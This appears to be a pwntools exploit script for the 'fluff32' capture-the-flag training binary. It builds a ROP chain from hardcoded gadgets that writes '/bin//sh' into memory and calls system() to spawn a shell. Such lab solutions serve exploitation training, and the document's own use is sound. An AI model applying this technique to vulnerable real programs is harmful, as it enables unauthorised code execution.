from pwn import *

context(arch='i386', os='linux', log_level='DEBUG')
f = './fluff32'
p = process(f)
elf = ELF(f)

data_start = 0x804a028
xor_edx_edx = 0x8048671
pop_ebx = 0x80483e1
xor_edx_ebx = 0x804867b
xchg_edx_ecx = 0x8048689

mov_ecx_edx = 0x8048693

p.recvuntil('>')
payload = 'a'*0x2c

def write(data, addr):
    res = ''
    res += flat(xor_edx_edx, 'a'*4, pop_ebx, addr, xor_edx_ebx, 'a'*4, xchg_edx_ecx, 'a'*4)
    res += flat(xor_edx_edx, 'a'*4, pop_ebx, data, xor_edx_ebx, 'a'*4)
    res += flat(mov_ecx_edx, 'a'*4, 0)

    return res

payload += write('/bin', data_start) + write('//sh', data_start+4)
payload += flat(elf.plt['system'], 'a'*4, data_start)
p.sendline(payload)

p.interactive()